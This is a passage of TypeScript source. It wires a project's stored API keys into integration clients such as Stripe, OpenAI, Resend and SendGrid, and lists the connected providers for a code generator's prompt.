      let key: string | null = null
      for (const kid of spec.keyStoreIds) {
        key = await getIntegrationKey(projectId, kid).catch(() => null)
        if (key) break
      }
      if (!key) return

      const auxValue = spec.auxKeyStoreId
        ? await getIntegrationKey(projectId, spec.auxKeyStoreId).catch(() => null)
        : null

      const generic = buildGenericRequest(spec, key, auxValue)

      if (ctx[spec.id] && typeof ctx[spec.id] === 'object') {
        // Rich provider already built (stripe/openai/anthropic) — add request() as
        // an escape hatch alongside the typed helpers.
        if (typeof (ctx[spec.id] as any).request !== 'function') {
          ;(ctx[spec.id] as any).request = generic.request
        }
      } else {
        ctx[spec.id] = generic
      }

      // Register every alias so isConnected('kling' / 'claude' / 'sms') works.
      for (const name of spec.connectedNames) connected.add(name.toLowerCase())
      connected.add(spec.id.toLowerCase())
    }),
  )

  // Defensive alias: if mail sending is configured, alias .send onto ctx.resend / ctx.sendgrid
  // so any existing code or model output that calls ctx.integrations.resend.send() routes
  // safely to ctx.integrations.email.send() rather than throwing TypeError.
  if (ctx.email) {
    if (ctx.resend && typeof ctx.resend === 'object' && typeof (ctx.resend as any).send !== 'function') {
      ;(ctx.resend as any).send = ctx.email.send
    }
    if (ctx.sendgrid && typeof ctx.sendgrid === 'object' && typeof (ctx.sendgrid as any).send !== 'function') {
      ;(ctx.sendgrid as any).send = ctx.email.send
    }
  }

  return ctx
}

/**
 * Return a human-readable summary of which integrations are connected.
 * Used by the generator to include in the function prompt.
 */
/**
 * Canonical provider ids that have a stored key on this project (registry-driven).
 * Includes the 'email' pseudo-provider AND the concrete resend/sendgrid ids, so
 * both ctx.integrations.email.send and ctx.integrations.resend.request are
 * documented. Used by the function generator to render the ctx.integrations docs.
 */
export async function getConnectedProviderIds(projectId: string): Promise<string[]> {
  const specs = Object.values(INTEGRATION_PROVIDERS)
  const results = await Promise.all(
    specs.map(async (spec) => {
      for (const kid of spec.keyStoreIds) {
        const key = await getIntegrationKey(projectId, kid).catch(() => null)
        if (key) return spec.id
      }
      return null
    }),
  )
  return results.filter((id): id is string => !!id)
}

export async function getConnectedIntegrationNames(projectId: string): Promise<string[]> {
  // Registry-driven so EVERY provider (incl. replicate/runway/stability/onesignal)
  // is reported — the old hardcoded list is what made them phantom to the generator.
  // Skip the 'email' pseudo-provider: resend/sendgrid report themselves.
  const specs = Object.values(INTEGRATION_PROVIDERS).filter((s) => s.id !== 'email')

  const results = await Promise.all(
    specs.map(async (spec) => {
      for (const kid of spec.keyStoreIds) {
        const key = await getIntegrationKey(projectId, kid).catch(() => null)
        if (key) return spec
      }
      return null
    }),
  )

  const CATEGORY_HINT: Record<string, string> = {
    email: 'email',
    sms: 'SMS',
    analytics: 'analytics',
    video: 'generative AI',
    push: 'push',
  }

  const names: string[] = []
  for (const spec of results) {
    if (!spec) continue
    const hint = CATEGORY_HINT[spec.category]
    names.push(hint ? `${spec.id} (${hint})` : spec.id)
  }
  return names
}
